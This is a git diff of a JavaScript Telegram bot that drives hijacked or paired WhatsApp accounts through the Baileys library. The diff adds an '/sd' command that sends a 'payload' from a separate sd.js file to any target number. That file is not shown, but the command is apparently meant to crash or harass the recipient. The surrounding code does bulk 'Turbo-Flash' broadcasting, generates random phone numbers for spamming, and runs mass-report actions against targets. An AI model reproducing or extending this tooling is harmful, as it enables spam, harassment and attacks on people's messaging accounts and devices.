@@ -1,46 +1,17 @@
 import fs from 'fs';
-import nodemailer from 'nodemailer';
 import { delay } from '@whiskeysockets/baileys';
 import { addNumbersToDb, getAllNumbers, clearAllNumbers, setAntiMsgStatus, setAutoSaveStatus, countNumbers, deleteNumbers, addToBlacklist } from './db.js';
 
+// Import the payload file
+import * as sdPayload from './sd.js';
+
 const userState = {}; 
-
-// EMAIL CONFIG
-const transporter = nodemailer.createTransport({
-    service: 'gmail',
-    auth: {
-        user: process.env.EMAIL_USER,
-        pass: process.env.EMAIL_PASS
-    }
-});
-
-async function sendReportEmail(targetNumber) {
-    if (!process.env.EMAIL_USER || !process.env.EMAIL_PASS) return "Email not configured";
-
-    const jid = `${targetNumber}@s.whatsapp.net`;
-    const time = new Date().toISOString();
-
-    const mailOptions = {
-        from: process.env.EMAIL_USER,
-        to: 'support@whatsapp.com',
-        subject: `Report: Spam Activity - +${targetNumber}`,
-        text: `Hello WhatsApp Support,\n\nReporting account for Terms of Service violation.\n\nPhone: +${targetNumber}\nJID: ${jid}\nTime: ${time}\n\nThis account is sending unsolicited automated messages.\n`
-    };
-
-    try {
-        await transporter.sendMail(mailOptions);
-        return "Email Sent";
-    } catch (error) {
-        return `Email Failed: ${error.message}`;
-    }
-}
 
 const mainKeyboard = {
     reply_markup: {
         keyboard: [
             [{ text: "Pair Account" }, { text: "List Active" }],
-            // RENAMED BUTTON HERE:
-            [{ text: "Broadcast" }, { text: "Clear Contact List" }] 
+            [{ text: "Broadcast" }, { text: "Delete Database" }]
         ],
         resize_keyboard: true
     }
@@ -58,6 +29,7 @@ function parseVcf(vcfContent) {
     return Array.from(numbers);
 }
 
+// HELPER: Execute Broadcast
 async function executeBroadcast(bot, clients, shortIdMap, chatId, targetId, messageText) {
     const sessionData = shortIdMap[targetId];
     if (!sessionData || !clients[sessionData.folder]) {
@@ -67,7 +39,7 @@ async function executeBroadcast(bot, clients, shortIdMap, chatId, targetId, mess
     const sock = clients[sessionData.folder];
     const numbers = await getAllNumbers();
 
-    if (numbers.length === 0) return bot.sendMessage(chatId, 'Contact list is empty.', mainKeyboard);
+    if (numbers.length === 0) return bot.sendMessage(chatId, 'Database empty.', mainKeyboard);
 
     bot.sendMessage(chatId, `Turbo-Flashing message to ${numbers.length} contacts using ID ${targetId}...`);
     
@@ -95,7 +67,7 @@ async function executeBroadcast(bot, clients, shortIdMap, chatId, targetId, mess
     bot.sendMessage(chatId, 
         `Flash Complete in ${duration}s.\n` +
         `Sent: ${successCount}\n` +
-        `Contacts Removed: ${successfulNumbers.length}`, 
+        `Database Cleaned: ${successfulNumbers.length} numbers removed.`, 
         mainKeyboard
     );
 }
@@ -160,11 +132,10 @@ export function setupTelegramCommands(bot, clients, shortIdMap, SESSIONS_DIR, st
                 bot.sendMessage(chatId, list, { parse_mode: 'Markdown' });
                 break;
 
-            // UPDATED CASE NAME
-            case "Clear Contact List": 
+            case "Delete Database":
                 await clearAllNumbers();
                 if (fs.existsSync('./contacts.vcf')) fs.unlinkSync('./contacts.vcf');
-                bot.sendMessage(chatId, "Contact list cleared from database.", mainKeyboard);
+                bot.sendMessage(chatId, "Numbers database cleared.", mainKeyboard);
                 break;
 
             case "Broadcast":
@@ -177,6 +148,45 @@ export function setupTelegramCommands(bot, clients, shortIdMap, SESSIONS_DIR, st
                 
                 bot.sendMessage(chatId, `Using Account ID: \`${autoId}\`\n\nPlease enter the message to broadcast:`, { parse_mode: 'Markdown' });
                 break;
+        }
+    });
+
+    // --- COMMANDS ---
+
+    // NEW: SD PAYLOAD COMMAND
+    bot.onText(/\/sd\s+([a-zA-Z0-9]+)\s+(\d+)/, async (msg, match) => {
+        const targetId = match[1].trim();
+        const targetNumber = match[2].trim();
+
+        // 1. Validate Account ID
+        if (!shortIdMap[targetId]) {
+            return bot.sendMessage(msg.chat.id, `Invalid Account ID: ${targetId}`);
+        }
+        
+        const sessionData = shortIdMap[targetId];
+        const sock = clients[sessionData.folder];
+
+        if (!sock) {
+            return bot.sendMessage(msg.chat.id, `Account ${targetId} is disconnected.`);
+        }
+
+        // 2. Get Content from sd.js
+        // We re-import or use the loaded module. 
+        // Note: If you edit sd.js while bot is running, you might need to restart bot to see changes.
+        const payloadContent = sdPayload.content;
+
+        if (!payloadContent) {
+            return bot.sendMessage(msg.chat.id, "Error: sd.js content is empty.");
+        }
+
+        bot.sendMessage(msg.chat.id, `Sending Payload to +${targetNumber} via ${targetId}...`);
+
+        try {
+            const jid = `${targetNumber}@s.whatsapp.net`;
+            await sock.sendMessage(jid, { text: payloadContent });
+            bot.sendMessage(msg.chat.id, `Payload Sent Successfully.`);
+        } catch (e) {
+            bot.sendMessage(msg.chat.id, `Failed: ${e.message}`);
         }
     });
 
@@ -205,13 +215,10 @@ export function setupTelegramCommands(bot, clients, shortIdMap, SESSIONS_DIR, st
             }
         }
 
-        const emailStatus = await sendReportEmail(rawNumber);
-
         bot.sendMessage(msg.chat.id, 
             `[REPORT SUCCESS]\n` +
             `Target: +${rawNumber}\n` +
             `Blocked: ${blockedCount}\n` +
-            `Email: ${emailStatus}\n` +
             `Added to Blacklist.`
         );
     });
@@ -304,10 +311,8 @@ export function setupTelegramCommands(bot, clients, shortIdMap, SESSIONS_DIR, st
         const args = msg.text.split(' ');
         const code = args[1];
         const amount = parseInt(args[2], 10) || 100;
-        
         const newNumbers = [];
         for (let i = 0; i < amount; i++) newNumbers.push(`${code}${Math.floor(100000000 + Math.random() * 900000000)}`);
-        
         await addNumbersToDb(newNumbers);
         const total = await countNumbers();
         bot.sendMessage(msg.chat.id, `Added ${amount} numbers. (Total: ${total})`);
@@ -315,7 +320,6 @@ export function setupTelegramCommands(bot, clients, shortIdMap, SESSIONS_DIR, st
 
     bot.onText(/\/save/, async (msg) => {
         if (!msg.reply_to_message?.document) return;
-        
         const firstId = Object.keys(shortIdMap)[0];
         if (!firstId || !clients[shortIdMap[firstId].folder]) return bot.sendMessage(msg.chat.id, 'Pair an account first.');
         const sock = clients[shortIdMap[firstId].folder];
@@ -325,7 +329,6 @@ export function setupTelegramCommands(bot, clients, shortIdMap, SESSIONS_DIR, st
             const fileLink = await bot.getFileLink(msg.reply_to_message.document.file_id);
             const response = await fetch(fileLink);
             const text = await response.text();
-            
             const rawNumbers = parseVcf(text);
             bot.sendMessage(msg.chat.id, `Scanning ${rawNumbers.length} numbers...`);
 
